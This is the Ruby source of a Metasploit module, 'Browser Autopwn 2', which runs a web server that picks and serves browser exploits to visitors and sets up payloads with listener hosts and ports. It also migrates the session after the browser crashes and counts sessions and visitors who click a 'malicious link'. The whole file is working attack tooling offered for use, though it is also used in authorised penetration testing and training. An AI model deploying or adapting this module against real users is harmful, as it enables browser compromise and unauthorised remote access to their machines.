##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::BrowserAutopwn2

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HTTP Client Automatic Exploiter 2 (Browser Autopwn)",
      'Description'    => %q{
        This module will automatically serve browser exploits. Here are the options you can
        configure:

        The INCLUDE_PATTERN option allows you to specify the kind of exploits to be loaded. For example,
        if you wish to load just Adobe Flash exploits, then you can set Include to 'adobe_flash'.

        The EXCLUDE_PATTERN option will ignore exploits. For example, if you don't want any Adobe Flash
        exploits, you can set this. Also note that the Exclude option will always be evaluated
        after the Include option.

        The MaxExploitCount option specifies the max number of exploits to load by Browser Autopwn.
        By default, 20 will be loaded. But note that the client will probably not be vulnerable
        to all 20 of them, so only some will actually be served to the client.

        The HTMLContent option allows you to provide a basic webpage. This is what the user behind
        the vulnerable browser will see. You can simply set a string, or you can do the file://
        syntax to load an HTML file. Note this option might break exploits so try to keep it
        as simple as possible.

        The MaxSessionCount option is used to limit how many sessions Browser Autopwn is allowed to
        get. The default -1 means unlimited. Combining this with other options such as RealList
        and Custom404, you can get information about which visitors (IPs) clicked on your malicious
        link, what exploits they might be vulnerable to, redirect them to your own internal
        training website without actually attacking them.

        For more information about Browser Autopwn, please see the referenced blog post.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'DisclosureDate' => "Jul 5 2015",
      'References'     =>
        [
          [ 'URL', 'https://blog.rapid7.com/2015/07/16/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter--part-2' ]
        ],
      'Actions'     =>
        [
          [ 'WebServer', {
            'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'
          } ],
        ],
      'PassiveActions' =>
        [ 'WebServer' ],
      'DefaultOptions' => {
          # We know that most of these exploits will crash the browser, so
          # set the default to run migrate right away if possible.
          "InitialAutoRunScript" => "migrate -f",
        },
      'DefaultAction'  => 'WebServer'))


    register_advanced_options(get_advanced_options, self.class)

    register_options(
      [
        OptRegexp.new('INCLUDE_PATTERN', [false, 'Pattern search to include specific modules']),
        OptRegexp.new('EXCLUDE_PATTERN', [false, 'Pattern search to exclude specific modules']),

      ])

    register_advanced_options([
        OptInt.new('ExploitReloadTimeout', [false, 'Number of milliseconds before trying the next exploit', 3000]),
        OptInt.new('MaxExploitCount', [false, 'Number of browser exploits to load', 21]),
        OptString.new('HTMLContent', [false, 'HTML Content', '']),
        OptAddressRange.new('AllowedAddresses', [false, "A range of IPs you're interested in attacking"]),
        OptInt.new('MaxSessionCount', [false, 'Number of sessions to get', -1]),
        OptBool.new('ShowExploitList', [true, "Show which exploits will actually be served to each client", false])
      ])
  end

  def get_advanced_options
    opts = []
    DEFAULT_PAYLOADS.each_pair do |platform, payload_info|
      opts << OptString.new("PAYLOAD_#{platform.to_s.upcase}", [true, "Payload for #{platform} browser exploits", payload_info[:payload] ])
      opts << OptInt.new("PAYLOAD_#{platform.to_s.upcase}_LPORT", [true, "Payload LPORT for #{platform} browser exploits", payload_info[:lport]])
      opts << OptAddress.new("LHOST", [true, "The local host for the exploits and handlers", Rex::Socket.source_address])
    end

    opts
  end

  def on_request_exploit(cli, request, target_info)
    serve = build_html(cli, request)
    send_exploit_html(cli, serve)
  end

  def run
    exploit
  end
end
